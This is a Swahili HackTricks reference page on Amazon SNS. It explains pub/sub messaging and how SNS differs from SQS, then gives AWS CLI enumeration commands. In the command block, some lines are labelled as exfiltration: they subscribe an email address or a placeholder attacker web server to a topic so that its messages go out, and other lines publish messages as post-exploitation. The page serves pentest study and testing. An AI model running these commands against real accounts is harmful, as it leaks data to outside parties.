# AWS - SNS Enum

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## SNS

Amazon Simple Notification Service (Amazon SNS) inaelezwa kama **huduma ya ujumbe iliyosimamiwa kabisa**. Inasaidia aina zote za **mawasiliano kutoka kwa programu hadi programu** (A2A) na kutoka kwa programu hadi mtu (A2P).

Vipengele muhimu kwa mawasiliano ya A2A ni pamoja na **mifumo ya kuchapisha/kusikiliza (pub/sub)**. Mifumo hii inaleta **mada**, muhimu kwa kuwezesha ujumbe wa **juu wa kiasi, msukumo, kutoka kwa wengi kwenda kwa wengi**. Kipengele hiki ni cha faida kubwa katika mazingira yanayohusisha mifumo iliyosambazwa, huduma ndogo ndogo, na miundo ya seva isiyotumia seva. Kwa kutumia mada hizi, mifumo ya wachapishaji inaweza kusambaza ujumbe kwa ufanisi kwa **aina mbalimbali za mifumo ya wasikilizaji**, ikirahisisha mfano wa ujumbe wa fanout.

### **Tofauti na SQS**

**SQS** ni huduma ya msingi wa **foleni** inayoruhusu mawasiliano ya moja kwa moja, ikisimamia ujumbe kwa mtumiaji **mmoja tu**. Inatoa **utoaji wa angalau mara moja**, inasaidia foleni za kawaida na za FIFO, na inaruhusu uhifadhi wa ujumbe kwa kujaribu tena na usindikaji uliocheleweshwa.\
Kwa upande mwingine, **SNS** ni huduma inayotegemea **kuchapisha/kusikiliza**, ikiruhusu mawasiliano ya **moja kwa wengi** kwa kutangaza ujumbe kwa **wasikilizaji wengi** kwa wakati mmoja. Inasaidia **vituo mbalimbali vya usajili kama vile barua pepe, SMS, kazi za Lambda, na HTTP/HTTPS**, na inatoa mifumo ya kuchuja kwa utoaji wa ujumbe uliolengwa.\
Ingawa huduma zote mbili zinaruhusu kutenganisha kati ya vipengele katika mifumo iliyosambazwa, SQS inazingatia mawasiliano ya foleni, na SNS inasisitiza mifumo ya mawasiliano ya tukio, ya fan-out.

### **Uorodheshaji**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
Tafadhali kumbuka kwamba ikiwa **mada ni aina ya FIFO**, watumiaji waandikishaji wanaotumia itifaki ya **SQS** tu ndio wanaweza kutumika (HTTP au HTTPS hawawezi kutumika).

Pia, hata kama `--topic-arn` ina mkoa hakikisha unataja mkoa sahihi katika **`--region`** au utapata kosa linaloonekana kama huna ufikiaji lakini tatizo ni mkoa.
{% endhint %}

### Upatikanaji usiothibitishwa

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

### Kupandisha Hadhi

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

### Baada ya Uvamizi

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

### Uthabiti

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

# Marejeo
* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swagi rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
